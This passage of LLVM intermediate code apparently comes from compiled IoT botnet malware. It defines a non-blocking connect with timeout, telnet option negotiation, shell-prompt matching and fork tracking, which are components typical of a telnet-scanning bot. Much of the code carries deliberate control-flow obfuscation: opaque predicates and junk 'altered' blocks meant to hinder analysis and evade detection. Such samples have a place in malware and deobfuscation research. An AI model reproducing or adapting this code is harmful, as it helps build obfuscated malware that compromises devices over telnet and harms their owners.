  %324 = getelementptr inbounds i8, i8* %323, i32 1
  store i8* %324, i8** %17, align 8
  store i8 %322, i8* %323, align 1
  %325 = load i8, i8* %16, align 1
  %326 = zext i8 %325 to i32
  %327 = icmp eq i32 %326, 10
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %252
  %328 = load i32, i32* %18, align 4
  %_55 = sub i32 %328, 1
  %gen56 = mul i32 %_55, 1
  %_57 = sub i32 0, %328
  %gen58 = add i32 %_57, 1
  %_59 = sub i32 %328, 1
  %gen60 = mul i32 %_59, 1
  %329 = add nsw i32 %328, 1
  store i32 %329, i32* %18, align 4
  br label %originalBB54

originalBB64alteredBB:                            ; preds = %originalBB64, %274
  %330 = load i32, i32* %4, align 4
  br label %originalBB64
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %164

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %139

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #13
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %121

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

; <label>:54:                                     ; preds = %49
  %55 = load i32, i32* @x.41
  %56 = load i32, i32* @y.42
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %54
  %63 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %64 = getelementptr inbounds [16 x i64], [16 x i64]* %63, i64 0, i64 0
  %65 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %64) #2, !srcloc !3
  %66 = extractvalue { i64, i64* } %65, 0
  %67 = extractvalue { i64, i64* } %65, 1
  %68 = trunc i64 %66 to i32
  store i32 %68, i32* %17, align 4
  %69 = ptrtoint i64* %67 to i64
  %70 = trunc i64 %69 to i32
  store i32 %70, i32* %18, align 4
  %71 = load i32, i32* @x.41
  %72 = load i32, i32* @y.42
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %79

; <label>:79:                                     ; preds = %originalBBpart2
  %80 = load i32, i32* %6, align 4
  %81 = srem i32 %80, 64
  %82 = zext i32 %81 to i64
  %83 = shl i64 1, %82
  %84 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %85 = load i32, i32* %6, align 4
  %86 = sdiv i32 %85, 64
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %84, i64 0, i64 %87
  %89 = load i64, i64* %88, align 8
  %90 = or i64 %89, %83
  store i64 %90, i64* %88, align 8
  %91 = load i32, i32* %6, align 4
  %92 = add nsw i32 %91, 1
  %93 = call i32 @select(i32 %92, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %94 = icmp sgt i32 %93, 0
  br i1 %94, label %95, label %119

; <label>:95:                                     ; preds = %79
  store i32 4, i32* %13, align 4
  %96 = load i32, i32* %6, align 4
  %97 = bitcast i32* %14 to i8*
  %98 = call i32 @getsockopt(i32 %96, i32 1, i32 4, i8* %97, i32* %13) #2
  %99 = load i32, i32* %14, align 4
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %101, label %118

; <label>:101:                                    ; preds = %95
  %102 = load i32, i32* @x.41
  %103 = load i32, i32* @y.42
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %101
  store i32 0, i32* %5, align 4
  %110 = load i32, i32* @x.41
  %111 = load i32, i32* @y.42
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %164

; <label>:118:                                    ; preds = %95
  br label %120

; <label>:119:                                    ; preds = %79
  store i32 0, i32* %5, align 4
  br label %164

; <label>:120:                                    ; preds = %118
  br label %122

; <label>:121:                                    ; preds = %45
  store i32 0, i32* %5, align 4
  br label %164

; <label>:122:                                    ; preds = %120
  %123 = load i32, i32* @x.41
  %124 = load i32, i32* @y.42
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %122
  %131 = load i32, i32* @x.41
  %132 = load i32, i32* @y.42
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %139

; <label>:139:                                    ; preds = %originalBBpart28, %37
  %140 = load i32, i32* @x.41
  %141 = load i32, i32* @y.42
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %139
  %148 = load i32, i32* %6, align 4
  %149 = call i32 (i32, i32, ...) @fcntl(i32 %148, i32 3, i8* null)
  %150 = sext i32 %149 to i64
  store i64 %150, i64* %15, align 8
  %151 = load i64, i64* %15, align 8
  %152 = and i64 %151, -2049
  store i64 %152, i64* %15, align 8
  %153 = load i32, i32* %6, align 4
  %154 = load i64, i64* %15, align 8
  %155 = call i32 (i32, i32, ...) @fcntl(i32 %153, i32 4, i64 %154)
  store i32 1, i32* %5, align 4
  %156 = load i32, i32* @x.41
  %157 = load i32, i32* @y.42
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart224, label %originalBB10alteredBB

originalBBpart224:                                ; preds = %originalBB10
  br label %164

; <label>:164:                                    ; preds = %originalBBpart224, %121, %119, %originalBBpart24, %36
  %165 = load i32, i32* %5, align 4
  ret i32 %165

originalBBalteredBB:                              ; preds = %originalBB, %54
  %166 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %167 = getelementptr inbounds [16 x i64], [16 x i64]* %166, i64 0, i64 0
  %168 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %167) #2, !srcloc !3
  %169 = extractvalue { i64, i64* } %168, 0
  %170 = extractvalue { i64, i64* } %168, 1
  %171 = trunc i64 %169 to i32
  store i32 %171, i32* %17, align 4
  %172 = ptrtoint i64* %170 to i64
  %173 = trunc i64 %172 to i32
  store i32 %173, i32* %18, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %101
  store i32 0, i32* %5, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %122
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %139
  %174 = load i32, i32* %6, align 4
  %175 = call i32 (i32, i32, ...) @fcntl(i32 %174, i32 3, i8* null)
  %176 = sext i32 %175 to i64
  store i64 %176, i64* %15, align 8
  %177 = load i64, i64* %15, align 8
  %_ = sub i64 %177, -2049
  %gen = mul i64 %_, -2049
  %_11 = shl i64 %177, -2049
  %_12 = sub i64 0, %177
  %gen13 = add i64 %_12, -2049
  %_14 = sub i64 0, %177
  %gen15 = add i64 %_14, -2049
  %_16 = sub i64 0, %177
  %gen17 = add i64 %_16, -2049
  %_18 = sub i64 0, %177
  %gen19 = add i64 %_18, -2049
  %_20 = sub i64 0, %177
  %gen21 = add i64 %_20, -2049
  %_22 = shl i64 %177, -2049
  %178 = and i64 %177, -2049
  store i64 %178, i64* %15, align 8
  %179 = load i32, i32* %6, align 4
  %180 = load i64, i64* %15, align 8
  %181 = call i32 (i32, i32, ...) @fcntl(i32 %179, i32 4, i64 %180)
  store i32 1, i32* %5, align 4
  br label %originalBB10
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #2
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #2
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %125 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %143

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %102

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %101

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %60

; <label>:36:                                     ; preds = %30
  %37 = load i32, i32* @x.45
  %38 = load i32, i32* @y.46
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 251, i32 253
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  %52 = load i32, i32* @x.45
  %53 = load i32, i32* @y.46
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %84

; <label>:60:                                     ; preds = %30
  %61 = load i32, i32* @x.45
  %62 = load i32, i32* @y.46
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %60
  %69 = load i8*, i8** %6, align 8
  %70 = getelementptr inbounds i8, i8* %69, i64 1
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 253
  %74 = select i1 %73, i32 252, i32 254
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %8, align 1
  %76 = load i32, i32* @x.45
  %77 = load i32, i32* @y.46
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %84

; <label>:84:                                     ; preds = %originalBBpart24, %originalBBpart2
  %85 = load i32, i32* @x.45
  %86 = load i32, i32* @y.46
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %84
  %93 = load i32, i32* @x.45
  %94 = load i32, i32* @y.46
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %101

; <label>:101:                                    ; preds = %originalBBpart28, %29
  br label %102

; <label>:102:                                    ; preds = %101, %22
  %103 = load i32, i32* @x.45
  %104 = load i32, i32* @y.46
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %102
  %111 = load i32, i32* %5, align 4
  %112 = call i64 @send(i32 %111, i8* %8, i64 1, i32 16384)
  %113 = load i32, i32* %5, align 4
  %114 = load i8*, i8** %6, align 8
  %115 = getelementptr inbounds i8, i8* %114, i64 2
  %116 = call i64 @send(i32 %113, i8* %115, i64 1, i32 16384)
  %117 = load i32, i32* @x.45
  %118 = load i32, i32* @y.46
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %142

; <label>:125:                                    ; preds = %3
  %126 = load i32, i32* @x.45
  %127 = load i32, i32* @y.46
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %125
  %134 = load i32, i32* @x.45
  %135 = load i32, i32* @y.46
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %142

; <label>:142:                                    ; preds = %originalBBpart216, %originalBBpart212
  store i32 0, i32* %4, align 4
  br label %143

; <label>:143:                                    ; preds = %142, %13
  %144 = load i32, i32* @x.45
  %145 = load i32, i32* @y.46
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %143
  %152 = load i32, i32* %4, align 4
  %153 = load i32, i32* @x.45
  %154 = load i32, i32* @y.46
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  ret i32 %152

originalBBalteredBB:                              ; preds = %originalBB, %36
  %161 = load i8*, i8** %6, align 8
  %162 = getelementptr inbounds i8, i8* %161, i64 1
  %163 = load i8, i8* %162, align 1
  %164 = zext i8 %163 to i32
  %165 = icmp eq i32 %164, 253
  %166 = select i1 %165, i32 251, i32 253
  %167 = trunc i32 %166 to i8
  store i8 %167, i8* %8, align 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %60
  %168 = load i8*, i8** %6, align 8
  %169 = getelementptr inbounds i8, i8* %168, i64 1
  %170 = load i8, i8* %169, align 1
  %171 = zext i8 %170 to i32
  %172 = icmp eq i32 %171, 253
  %173 = select i1 %172, i32 252, i32 254
  %174 = trunc i32 %173 to i8
  store i8 %174, i8* %8, align 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %84
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %102
  %175 = load i32, i32* %5, align 4
  %176 = call i64 @send(i32 %175, i8* %8, i64 1, i32 16384)
  %177 = load i32, i32* %5, align 4
  %178 = load i8*, i8** %6, align 8
  %179 = getelementptr inbounds i8, i8* %178, i64 2
  %180 = call i64 @send(i32 %177, i8* %179, i64 1, i32 16384)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %125
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %143
  %181 = load i32, i32* %4, align 4
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %193, %1
  %12 = load i32, i32* @x.47
  %13 = load i32, i32* @y.48
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load i32, i32* %6, align 4
  %21 = sext i32 %20 to i64
  %22 = load i8*, i8** %4, align 8
  %23 = call i64 @strlen(i8* %22) #10
  %24 = icmp ult i64 %21, %23
  %25 = load i32, i32* @x.47
  %26 = load i32, i32* @y.48
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %196

; <label>:33:                                     ; preds = %originalBBpart2
  br label %34

; <label>:34:                                     ; preds = %originalBBpart228, %33
  %35 = load i32, i32* @x.47
  %36 = load i32, i32* @y.48
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = load i32, i32* %5, align 4
  %44 = load i32, i32* %7, align 4
  %45 = icmp sgt i32 %43, %44
  %46 = load i32, i32* @x.47
  %47 = load i32, i32* @y.48
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %45, label %54, label %120

; <label>:54:                                     ; preds = %originalBBpart24
  %55 = load i8*, i8** %3, align 8
  %56 = load i32, i32* %5, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = load i32, i32* %7, align 4
  %60 = sext i32 %59 to i64
  %61 = sub i64 0, %60
  %62 = getelementptr inbounds i8, i8* %58, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %118, label %66

; <label>:66:                                     ; preds = %54
  %67 = load i32, i32* @x.47
  %68 = load i32, i32* @y.48
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %66
  %75 = load i8*, i8** %3, align 8
  %76 = load i32, i32* %5, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i32, i32* %7, align 4
  %80 = sext i32 %79 to i64
  %81 = sub i64 0, %80
  %82 = getelementptr inbounds i8, i8* %78, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = icmp eq i32 %84, 32
  %86 = load i32, i32* @x.47
  %87 = load i32, i32* @y.48
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart218, label %originalBB6alteredBB

originalBBpart218:                                ; preds = %originalBB6
  br i1 %85, label %118, label %94

; <label>:94:                                     ; preds = %originalBBpart218
  %95 = load i8*, i8** %3, align 8
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8, i8* %95, i64 %97
  %99 = load i32, i32* %7, align 4
  %100 = sext i32 %99 to i64
  %101 = sub i64 0, %100
  %102 = getelementptr inbounds i8, i8* %98, i64 %101
  %103 = load i8, i8* %102, align 1
  %104 = sext i8 %103 to i32
  %105 = icmp eq i32 %104, 13
  br i1 %105, label %118, label %106

; <label>:106:                                    ; preds = %94
  %107 = load i8*, i8** %3, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = load i32, i32* %7, align 4
  %112 = sext i32 %111 to i64
  %113 = sub i64 0, %112
  %114 = getelementptr inbounds i8, i8* %110, i64 %113
  %115 = load i8, i8* %114, align 1
  %116 = sext i8 %115 to i32
  %117 = icmp eq i32 %116, 10
  br label %118

; <label>:118:                                    ; preds = %106, %94, %originalBBpart218, %54
  %119 = phi i1 [ true, %94 ], [ true, %originalBBpart218 ], [ true, %54 ], [ %117, %106 ]
  br label %120

